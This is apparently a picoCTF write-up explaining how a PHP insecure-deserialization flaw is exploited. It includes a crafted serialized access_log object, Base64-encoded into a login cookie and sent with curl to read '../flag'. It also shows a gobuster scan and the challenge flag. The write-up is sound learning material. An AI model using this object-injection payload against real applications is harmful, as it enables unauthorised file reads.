# Overview
<img width="1920" height="427" alt="Screenshot_2025-09-28_10-39-25" src="https://github.com/user-attachments/assets/91c35308-8688-4bbd-9f31-c89624fff7b8" />
The target is just a normal login portal

# Actions
I need to check whether this site has `robots.txt` file or not
<img width="625" height="165" alt="Screenshot_2025-09-28_10-47-07" src="https://github.com/user-attachments/assets/373aa761-95f0-429c-8636-456ad2144e32" />

Yeah it contains but does not provide much information about it. Next I think that I need to find more hidden endpoints, so I decide to use `gobuster`
```
gobuster dir -u 'http://mercury.picoctf.net:8404/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64
```
However, I got a lot of timeout, so I reckon that this technique is useless now.
Well, putting more attention to the content in `robots.txt`, I noticed that the extension php is different which is `phps` , for more secure?
Browsing overflow gives me the answer 
- .phps will just output literally a color-formatted content of that script as shown below.
I need to try with `index.php`
<img width="1618" height="806" alt="Screenshot_2025-09-28_11-04-42" src="https://github.com/user-attachments/assets/d94c9140-fa2e-4fd9-976d-7ee1df053a37" />

and I found another interesting endpoint which is `authentication.php`
<img width="1919" height="339" alt="Screenshot_2025-09-28_11-05-37" src="https://github.com/user-attachments/assets/b666e311-03ff-4d8e-859c-2ede0a6ded3c" />

Do the same technique
<img width="806" height="565" alt="Screenshot_2025-09-28_11-06-41" src="https://github.com/user-attachments/assets/8a024d8c-8088-45df-afb2-db5273024b6c" />

There would be some kind of token or something to check the permission, I need to use `BurpSuite` for interception this site
Little did I forgot about there is another file inside `authentication.phps` called `cookie.php` and I did the same with that file but using `BurpSuite` instead.
<img width="1260" height="685" alt="Screenshot_2025-09-28_11-25-17" src="https://github.com/user-attachments/assets/877ec606-e1f3-4b06-a7ef-306a50ac588b" />

I came across the term called `Deserialization` . What is it? Deserialization is the process of converting data from a lower-level format, such as a byte stream or string, into a usable object or data structure in memory.
Furthermore, the hint tells me that the flag is at `../flag`
Break down the logic
```
class access_log
{    // This variable will store the path to a log file ("../flag")
     // .It's public, meaning anyone (even an attacker) can set it
	public $log_file;	
    // When an access_log object is created, this constructor is automatically
    //called with a parameter $lf, which is stored into the log_file property.
function __construct($lf) {
		$this->log_file = $lf;
	}
    // Magic method called when the object is used as a string
    // Will be used to read the file
function __toString() {
  return $this->read_log();
 }
    // This method writes new $data to the file specified by $log_file
 function append_to_log($data) {
  file_put_contents($this->log_file, $data, FILE_APPEND);
 }
   //This function reads the file at $log_file 
   //and returns its contents as a string.
   // So if log_file is "../flag", this method will try to read the file 
 function read_log() {
  return file_get_contents($this->log_file);
 }
}
```
## Deserialization Logic
```
// Checks if a cookie named "login" is set in the user's browser.
// If it exists, the script continues
if (isset($_COOKIE["login"])) {
// urldecode()=> Decodes the cookie if it was URL-encoded (e.g., %3D becomes =).

// base64_decode()=>Converts the Base64-encoded string back into raw serialized data.

// unserialize()=>Converts the serialized string into a PHP object (it expects an object like access_log, permissions, etc.).
	try {
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
//When an error occurs (from unserialize() the catch block runs.
//die() stops the script immediately and prints the message:
// "Deserialization error. " and $perm is our desired flag !
followed by whatever $perm is.
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}
```
This is the frame of the payload I got from this [writeup](https://medium.com/@ahmednarmer1/ctf-day-40-74dc4866e071)
```
O:<length_of_class_name>:"<class_name>":<property_count>:{
    s:<length_of_property_name>:"<property_name>";<serialized_value>;}

note
O=> means its an object
s=> for property
```
Payload explanation
10 => length of access_log

class_name => access_log

property_count:1

s => string

8 => length of log_file

s=> string

7=> length of our desired file ../flag
here is the payload
```O:10:”access_log”:1:{s:8:”log_file”;s:7:”../flag”;}```

and using [cyberchef](https://gchq.github.io/CyberChef/#recipe=To_Base64('A-Za-z0-9%2B/%3D')&input=TzoxMDrigJ1hY2Nlc3NfbG9n4oCdOjE6e3M6ODrigJ1sb2dfZmlsZeKAnTtzOjc64oCdLi4vZmxhZ%2BKAnTt9&oenc=65001) to encode the payload as a token
```
curl mercury.picoctf.net:25395/authentication.php --cookie "login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9"
Deserialization error. picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_405f4c0e}
```
Done. Happy Hacking!!!!
